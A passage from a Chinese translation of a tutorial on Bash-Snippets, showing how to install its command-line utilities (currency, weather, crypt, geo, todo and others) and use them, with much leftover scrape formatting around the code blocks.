并按回车键。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nDo you wish to install currency [Y/n]: y,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,Do, ,you ,wish ,to, ,install ,currency, ,[,Y,/,n,],:, ,y,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,要安装所有脚本，运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo ./install.sh all,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo, ,.,/,install,.,sh ,all,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,要安装特定的脚本，比如 currency，运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo ./install.sh currency,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo, ,.,/,install,.,sh ,currency,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,你也可以使用 ,Linuxbrew, 包管理器来安装它。,\n,安装所有的工具，运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ brew install bash-snippets,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,brew ,install ,bash,-,snippets,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,安装特定的工具：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ brew install bash-snippets --without-all-tools --with-newton --with-weather,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,brew ,install ,bash,-,snippets, ,--,without,-,all,-,tools, ,--,with,-,newton, ,--,with,-,weather,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,另外，对于那些基于 Debian 系统的，例如 Ubuntu、Linux Mint，可以添加 PPA 源：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo add-apt-repository ppa:navanchauhan/bash-snippets\r\n$ sudo apt update\r\n$ sudo apt install bash-snippets,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo ,add,-,apt,-,repository ,ppa,:,navanchauhan,/,bash,-,snippets,$, ,sudo ,apt ,update,$, ,sudo ,apt ,install ,bash,-,snippets,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,用法,\n,需要网络连接,才能使用这些工具。用法很简单。让我们来看看如何使用其中的一些脚本，我假设你已经安装了所有脚本。,\n,1、 Currency – 货币转换器,\n,这个脚本根据实时汇率转换货币。输入当前货币代码和要交换的货币，以及交换的金额，如下所示：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ currency\r\nWhat is the base currency: INR\r\nWhat currency to exchange to: USD\r\nWhat is the amount being exchanged: 10\r\n\r\n=========================\r\n| INR to USD\r\n| Rate: 0.015495\r\n| INR: 10\r\n| USD: .154950\r\n=========================,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,currency,What ,is, ,the ,base ,currency,:, ,INR,What ,currency ,to, ,exchange ,to,:, ,USD,What ,is, ,the ,amount ,being ,exchanged,:, ,10, ,===,===,===,===,===,===,===,===,=,|, ,INR ,to, ,USD,|, ,Rate,:, ,0.015495,|, ,INR,:, ,10,|, ,USD,:, ,.,154950,===,===,===,===,===,===,===,===,=,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,你也可以在单条命令中传递所有参数，如下所示：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ currency INR USD 10,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,currency ,INR ,USD, ,10,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,参考以下屏幕截图：,\n,\n,2、 Stocks – 显示股票价格详细信息,\n,如果你想查看一只股票价格的详细信息，输入股票即可，如下所示：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ stocks Intel\r\n\r\nINTC stock info\r\n=============================================\r\n| Exchange Name: NASDAQ\r\n| Latest Price: 34.2500\r\n| Close (Previous Trading Day): 34.2500\r\n| Price Change: 0.0000\r\n| Price Change Percentage: 0.00%\r\n| Last Updated: Jul 12, 4:00PM EDT\r\n=============================================,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,stocks ,Intel, ,INTC ,stock ,info,===,===,===,===,===,===,===,===,===,===,===,===,===,===,===,|, ,Exchange ,Name,:, ,NASDAQ,|, ,Latest ,Price,:, ,34.2500,|, ,Close, ,(,Previous ,Trading ,Day,),:, ,34.2500,|, ,Price ,Change,:, ,0.0000,|, ,Price ,Change ,Percentage,:, ,0.00,%,|, ,Last ,Updated,:, ,Jul, ,12,,, ,4,:,00PM, ,EDT,===,===,===,===,===,===,===,===,===,===,===,===,===,===,===,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,上面输出了 ,Intel 股票, 的详情。,\n,3、 Weather – 显示天气详细信息,\n,让我们查看以下天气详细信息，运行以下命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ weather,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,weather,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,示例输出：,\n,\n,正如你在上面屏幕截图中看到的那样，它提供了 3 天的天气预报。不使用任何参数的话，它将根据你的 IP 地址显示天气详细信息。你还可以显示特定城市或国家/地区的天气详情，如下所示：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ weather Chennai,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,weather ,Chennai,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,同样，你可以查看输入以下命令来查看月相（月亮的形态）：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ weather moon,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,weather ,moon,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,示例输出：,\n,\n,4、 Crypt – 加解密文件,\n,此脚本对 openssl 做了一层包装，允许你快速轻松地加密和解密文件。,\n,要加密文件，使用以下命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ crypt -e [original file] [encrypted file],\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,crypt, ,-,e, ,[,original ,file,], ,[,encrypted ,file,],\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,例如，以下命令将加密 ,ostechnix.txt,，并将其保存在当前工作目录下，名为 ,encrypt_ostechnix.txt,。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ crypt -e ostechnix.txt encrypt_ostechnix.txt,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,crypt, ,-,e, ,ostechnix,.,txt ,encrypt_ostechnix,.,txt,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,输入两次文件密码：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nEncrypting ostechnix.txt...\r\nenter aes-256-cbc encryption password:\r\nVerifying - enter aes-256-cbc encryption password:\r\nSuccessfully encrypted,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,Encrypting ,ostechnix,.,txt,.,.,.,enter ,aes,-,256,-,cbc ,encryption ,password,:,Verifying, ,-, ,enter ,aes,-,256,-,cbc ,encryption ,password,:,Successfully ,encrypted,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,上面命令将使用 ,AES 256 位密钥,加密给定文件。密码不要保存在纯文本文件中。你可以加密 .pdf、.txt、 .docx、 .doc、 .png、 .jpeg 类型的文件。,\n,要解密文件，使用以下命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ crypt -d [encrypted file] [output file],\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,crypt, ,-,d, ,[,encrypted ,file,], ,[,output ,file,],\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,例如：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ crypt -d encrypt_ostechnix.txt ostechnix.txt,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,crypt, ,-,d, ,encrypt_ostechnix,.,txt ,ostechnix,.,txt,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,输入密码解密：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nDecrypting encrypt_ostechnix.txt...\r\nenter aes-256-cbc decryption password:\r\nSuccessfully decrypted\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,Decrypting ,encrypt_ostechnix,.,txt,.,.,.,enter ,aes,-,256,-,cbc ,decryption ,password,:,Successfully ,decrypted, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,5、 Movies – 查看电影详情,\n,使用这个脚本，你可以查看电影详情。,\n,以下命令显示了一部名为 “mother” 的电影的详情：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ movies mother\r\n\r\n==================================================\r\n| Title: Mother\r\n| Year: 2009\r\n| Tomato: 95%\r\n| Rated: R\r\n| Genre: Crime, Drama, Mystery\r\n| Director: Bong Joon Ho\r\n| Actors: Hye-ja Kim, Bin Won, Goo Jin, Je-mun Yun\r\n| Plot: A mother desperately searches for the killer who framed her son for a girl's horrific murder.\r\n==================================================,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,movies ,mother, ,===,===,===,===,===,===,===,===,===,===,===,===,===,===,===,===,==,|, ,Title,:, ,Mother,|, ,Year,:, ,2009,|, ,Tomato,:, ,95,%,|, ,Rated,:, ,R,|, ,Genre,:, ,Crime,,, ,Drama,,, ,Mystery,|, ,Director,:, ,Bong ,Joon ,Ho,|, ,Actors,:, ,Hye,-,ja ,Kim,,, ,Bin ,Won,,, ,Goo ,Jin,,, ,Je,-,mun ,Yun,|, ,Plot,:, ,A, ,mother ,desperately ,searches ,for, ,the ,killer ,who ,framed ,her ,son ,for, ,a, ,girl,',s, ,horrific ,murder,.,===,===,===,===,===,===,===,===,===,===,===,===,===,===,===,===,==,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,6、 显示类似条目,\n,要使用这个脚本，你需要从,这里, 获取 API 密钥。不过不用担心，它完全是免费的。一旦你获得 API 密钥后，将以下行添加到 ,~/.bash_profile,：,export TASTE_API_KEY=”你的 API 密钥放在这里”,。（LCTT 译注： TasteDive 是一个推荐引擎，它会根据你的品味推荐相关项目。）,\n,现在你可以根据你提供的项目查看类似项目，如下所示：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ taste -i Red Hot Chilli Peppers,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,taste, ,-,i, ,Red ,Hot ,Chilli ,Peppers,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,7、 Short – 缩短 URL,\n,这个脚本会缩短给定的 URL。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ short <URL>,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,short, ,<,URL,>,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,8、 Geo – 显示网络的详情,\n,这个脚本会帮助你查找网络的详细信息，例如广域网、局域网、路由器、 dns、mac 地址和 ip 地址。,\n,例如，要查找你的局域网 ip，运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ geo -l,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,geo, ,-,l,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,我系统上的输出：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n192.168.43.192,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,192.168.43.192,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,查看广域网 ip：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ geo -w,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,geo, ,-,w,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在终端中输入 ,geo, 来查看更多详细信息。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ geo\r\nGeo\r\nDescription: Provides quick access for wan, lan, router, dns, mac, and ip geolocation data\r\nUsage: geo [flag]\r\n -w Returns WAN IP\r\n -l Returns LAN IP(s)\r\n -r Returns Router IP\r\n -d Returns DNS Nameserver\r\n -m Returns MAC address for interface. Ex. eth0\r\n -g Returns Current IP Geodata\r\nExamples:\r\n geo -g\r\n geo -wlrdgm eth0\r\nCustom Geo Output =>\r\n[all] [query] [city] [region] [country] [zip] [isp]\r\nExample: geo -a 8.8.8.8 -o city,zip,isp\r\n -o [options] Returns Specific Geodata\r\n -a [address] For specific ip in -s\r\n -v Returns Version\r\n -h Returns Help Screen\r\n -u Updates Bash-Snippets,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,geo,Geo,Description,:, ,Provides ,quick ,access ,for, ,wan,,, ,lan,,, ,router,,, ,dns,,, ,mac,,, ,and, ,ip ,geolocation ,data,Usage,:, ,geo, ,[,flag,], ,-,w, ,Returns ,WAN ,IP, ,-,l, ,Returns ,LAN ,IP,(,s,), ,-,r, ,Returns ,Router ,IP, ,-,d, ,Returns ,DNS ,Nameserver, ,-,m, ,Returns ,MAC ,address ,for, ,interface,., ,Ex,., ,eth0, ,-,g, ,Returns ,Current ,IP ,Geodata,Examples,:, ,geo, ,-,g, ,geo, ,-,wlrdgm ,eth0,Custom ,Geo ,Output, ,=,>,[,all,], ,[,query,], ,[,city,], ,[,region,], ,[,country,], ,[,zip,], ,[,isp,],Example,:, ,geo, ,-,a, ,8.8.8.8, ,-,o, ,city,,,zip,,,isp, ,-,o, ,[,options,], ,Returns ,Specific ,Geodata, ,-,a, ,[,address,], ,For, ,specific ,ip ,in, ,-,s, ,-,v, ,Returns ,Version, ,-,h, ,Returns ,Help ,Screen, ,-,u, ,Updates ,Bash,-,Snippets,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,9、 Cheat – 显示 Linux 命令的备忘单,\n,想参考 Linux 命令的备忘单吗？这是可能的。以下命令将显示 ,curl, 命令的备忘单：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ cheat curl,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,cheat ,curl,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,只需用你选择的命令替换 ,curl, 即可显示其备忘单。这对于快速参考你要使用的任何命令非常有用。,\n,10、 Youtube-Viewer – 观看 YouTube 视频,\n,使用此脚本，你可以直接在终端上搜索或打开 YouTube 视频。（LCTT 译注：在媒体播放器中，而不是文本的终端中打开）,\n,让我们来看一些有关 ,Ed Sheeran, 的视频。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ ytview Ed Sheeran,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,ytview ,Ed ,Sheeran,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,从列表中选择要播放的视频。所选内容将在你的默认媒体播放器中播放。,\n,\n,要查看艺术家的近期视频，你可以使用：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ ytview -c [channel name],\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,ytview, ,-,c, ,[,channel ,name,],\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,要寻找视频，只需输入：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ ytview -s [videoToSearch],\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,ytview, ,-,s, ,[,videoToSearch,],\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,或者：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ ytview [videoToSearch],\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,ytview, ,[,videoToSearch,],\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,11、 cloudup – 备份 GitHub 仓库到 bitbucket,\n,你在 GitHub 上托管过任何项目吗？如果托管过，那么你可以随时间 GitHub 仓库备份到 ,bitbucket,，它是一种用于源代码和开发项目的基于 Web 的托管服务。,\n,你可以使用 ,-a, 选项一次性备份指定用户的所有 GitHub 仓库，或者备份单个仓库。,\n,要备份 GitHub 仓库，运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ cloudup,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,cloudup,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,系统将要求你输入 GitHub 用户名， 要备份的仓库名称以及 bitbucket 用户名和密码等。,\n,12、 Qrify – 将字符串转换为二维码,\n,这个脚本将任何给定的文本字符串转换为二维码。这对于发送链接或者保存一串命令到手机非常有用。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ qrify convert this text into qr code,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,qrify ,convert ,this, ,text ,into ,qr ,code,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,示例输出：,\n,\n,很酷，不是吗？,\n,13、 Cryptocurrency,\n,它将显示十大加密货币实时汇率。,\n,输入以下命令，然后单击回车来运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ cryptocurrency,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,cryptocurrency,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,14、 Lyrics,\n,这个脚本从命令行快速获取一首歌曲的歌词。,\n,例如，我将获取 “who is it” 歌曲的歌词，这是一首由 迈克尔·杰克逊Michael Jackson 演唱的流行歌曲。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ lyrics -a michael jackson -s who is it,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,lyrics, ,-,a, ,michael ,jackson, ,-,s, ,who ,is, ,it,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,15、 Meme,\n,这个脚本允许你从命令行创建简单的表情贴图。它比基于 GUI 的表情包生成器快得多。,\n,要创建一个表情贴图，只需输入：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ meme -f mymeme\r\nEnter the name for the meme's background (Ex. buzz, doge, blb ): buzz\r\nEnter the text for the first line: THIS IS A\r\nEnter the text for the second line: MEME,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,meme, ,-,f, ,mymeme,Enter ,the ,name ,for, ,the ,meme,',s, ,background, ,(,Ex,., ,buzz,,, ,doge,,, ,blb, ,),:, ,buzz,Enter ,the ,text ,for, ,the ,first ,line,:, ,THIS, ,IS, ,A,Enter ,the ,text ,for, ,the ,second ,line,:, ,MEME,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这将在你当前的工作目录创建 jpg 文件。,\n,16、 Newton,\n,厌倦了解决复杂的数学问题？你来对了。Newton 脚本将执行数值计算，乃至于符号数学解析。,\n,\n,17、 Siteciphers,\n,这个脚本可以帮助你检查在给定的 https 站点上启用/禁用哪些加密算法。（LCTT 译注：指 HTTPS 通讯中采用的加密算法）,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ siteciphers google.com,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,siteciphers ,google,.,com,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,18、 Todo,\n,它允许你直接从终端创建日常任务。,\n,让我们来创建一些任务。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ todo -a The first task\r\n01). The first task Tue Jun 26 14:51:30 IST 2018,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,todo, ,-,a, ,The ,first ,task,01,),., ,The ,first ,task ,Tue ,Jun, ,26, ,14,:,51,:,30, ,IST, ,2018,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,要添加其它任务，只需添加任务名称重新运行上述命令即可。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ todo -a The second task\r\n01). The first task Tue Jun 26 14:51:30 IST 2018\r\n02). The second task Tue Jun 26 14:52:29 IST 